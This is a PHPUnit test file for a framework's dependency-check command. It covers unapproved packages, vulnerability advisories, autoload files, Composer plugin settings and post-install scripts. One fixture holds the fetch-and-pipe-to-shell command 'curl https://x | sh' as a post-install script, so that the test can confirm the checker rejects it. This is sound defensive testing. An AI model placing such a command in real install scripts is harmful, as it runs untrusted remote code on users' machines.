<?php

declare(strict_types=1);

namespace StoneScriptPHP\Tests\Unit;

use PHPUnit\Framework\TestCase;

/** `stone deps:check`: approved packages, vulnerabilities, autoload "files", plugins, root scripts. */
final class DepsCheckTest extends TestCase
{
    private string $root;

    public static function setUpBeforeClass(): void
    {
        require_once dirname(__DIR__, 2) . '/cli/helpers/post-install.php';
    }

    protected function setUp(): void
    {
        $this->root = sys_get_temp_dir() . '/ssp-depscheck-' . bin2hex(random_bytes(6));
        mkdir($this->root . '/vendor/composer', 0755, true);
        $this->composerJson();
        $this->config(['approved' => ['vendors' => ['progalaxyelabs'], 'packages' => ['vlucas/phpdotenv']]]);
        $this->packages([['name' => 'progalaxyelabs/stonescriptphp', 'version' => '14.4.0', 'autoload' => ['files' => ['src/bootstrap.php']]]]);
        $fw = $this->root . '/vendor/progalaxyelabs/stonescriptphp';
        mkdir($fw . '/src', 0755, true);
        file_put_contents($fw . '/src/a.php', '<?php');
        file_put_contents($fw . '/framework-manifest.txt', ssp_format_manifest('14.4.0', ssp_build_framework_manifest($fw)));
    }

    protected function tearDown(): void
    {
        ssp_rrmdir($this->root);
    }

    private function composerJson(array $over = []): void
    {
        file_put_contents($this->root . '/composer.json', json_encode(array_replace_recursive([
            'config' => ['allow-plugins' => new \stdClass()],
            'scripts' => ['post-install-cmd' => ['@php vendor/progalaxyelabs/stonescriptphp/stone post-install'], 'post-update-cmd' => ['@php vendor/progalaxyelabs/stonescriptphp/stone post-install']],
        ], $over)));
    }

    private function config(array $c): void
    {
        file_put_contents($this->root . '/stone-packages.json', json_encode($c));
    }

    private function packages(array $pk, array $dev = []): void
    {
        if (!in_array('progalaxyelabs/stonescriptphp', array_column($pk, 'name'), true)) {
            $pk[] = ['name' => 'progalaxyelabs/stonescriptphp', 'version' => '14.4.0'];
        }
        file_put_contents($this->root . '/vendor/composer/installed.json', json_encode(['packages' => $pk, 'dev-package-names' => $dev]));
    }

    private function errors(?array $audit = []): string
    {
        return implode("\n", ssp_check_dependencies($this->root, $audit)['errors']);
    }

    public function test_clean_project_passes(): void
    {
        $this->assertSame('', $this->errors());
    }

    public function test_framework_autoload_files_need_no_review_but_its_integrity_is_checked(): void
    {
        $this->assertSame('', $this->errors());
        file_put_contents($this->root . '/vendor/progalaxyelabs/stonescriptphp/src/a.php', '<?php // changed');
        $this->assertStringContainsString('framework integrity: modified: src/a.php', $this->errors());
    }

    public function test_unapproved_package_fails(): void
    {
        $this->packages([['name' => 'evil/helper', 'version' => '1.0.0']]);
        $this->assertStringContainsString('unapproved package: evil/helper 1.0.0', $this->errors());
    }

    public function test_approved_package_by_name_and_by_vendor_pass(): void
    {
        $this->packages([['name' => 'vlucas/phpdotenv', 'version' => '5.6.0'], ['name' => 'progalaxyelabs/anything', 'version' => '1.0.0']]);
        $this->assertSame('', $this->errors());
    }

    public function test_dev_packages_are_ignored_unless_requested(): void
    {
        $this->packages([['name' => 'phpunit/phpunit', 'version' => '11.0.0']], ['phpunit/phpunit']);
        $this->assertSame('', $this->errors());
        $this->assertNotEmpty(ssp_check_dependencies($this->root, [], true)['errors']);
    }

    public function test_unreviewed_autoload_files_fail_and_are_listed(): void
    {
        $this->packages([['name' => 'vlucas/phpdotenv', 'version' => '5.6.0', 'autoload' => ['files' => ['src/boot.php']]]]);
        $r = ssp_check_dependencies($this->root, []);
        $this->assertStringContainsString('unreviewed autoload "files"', implode("\n", $r['errors']));
        $this->assertSame(['vlucas/phpdotenv' => ['src/boot.php']], $r['autoload_files']);
    }

    public function test_reviewed_autoload_files_pass_within_the_reviewed_range_only(): void
    {
        $pk = fn(string $v) => [['name' => 'vlucas/phpdotenv', 'version' => $v, 'autoload' => ['files' => ['src/boot.php']]]];
        $this->config(['approved' => ['packages' => ['vlucas/phpdotenv']], 'autoload_files_reviewed' => ['vlucas/phpdotenv' => '^5.6']]);
        $this->packages($pk('5.6.1'));
        $this->assertSame('', $this->errors());
        $this->packages($pk('6.0.0'));
        $this->assertStringContainsString('reviewed only for', $this->errors());
    }

    public function test_known_vulnerability_fails(): void
    {
        $audit = ['advisories' => ['vlucas/phpdotenv' => [['advisoryId' => 'PKSA-1', 'title' => 'RCE', 'link' => 'https://x']]]];
        $this->assertStringContainsString('known vulnerability in vlucas/phpdotenv: PKSA-1', $this->errors($audit));
    }

    public function test_abandoned_is_only_a_warning(): void
    {
        $r = ssp_check_dependencies($this->root, ['abandoned' => ['a/b' => 'c/d']]);
        $this->assertSame([], $r['errors']);
        $this->assertStringContainsString('abandoned package: a/b', implode("\n", $r['warnings']));
    }

    public function test_composer_plugin_package_fails_unless_approved(): void
    {
        $this->packages([['name' => 'progalaxyelabs/plug', 'version' => '1.0.0', 'type' => 'composer-plugin']]);
        $this->assertStringContainsString('unapproved Composer plugin', $this->errors());
        $this->config(['approved' => ['vendors' => ['progalaxyelabs']], 'plugins_approved' => ['progalaxyelabs/plug']]);
        $this->assertSame('', $this->errors());
    }

    public function test_allow_plugins_must_be_set_and_not_true(): void
    {
        file_put_contents($this->root . '/composer.json', json_encode(['scripts' => []]));
        $this->assertStringContainsString('allow-plugins is not set', $this->errors());
        file_put_contents($this->root . '/composer.json', json_encode(['config' => ['allow-plugins' => true]]));
        $this->assertStringContainsString('allow-plugins is true', $this->errors());
        file_put_contents($this->root . '/composer.json', json_encode(['config' => ['allow-plugins' => ['x/y' => true]]]));
        $this->assertStringContainsString('allows plugin x/y', $this->errors());
    }

    public function test_foreign_post_install_command_fails(): void
    {
        file_put_contents($this->root . '/composer.json', json_encode([
            'config' => ['allow-plugins' => new \stdClass()],
            'scripts' => ['post-install-cmd' => ['curl https://x | sh']],
        ]));
        $this->assertStringContainsString('contains a command other than', $this->errors());
    }

    public function test_missing_install_state_fails(): void
    {
        unlink($this->root . '/vendor/composer/installed.json');
        $this->assertStringContainsString('installed.json is missing', $this->errors());
    }
}
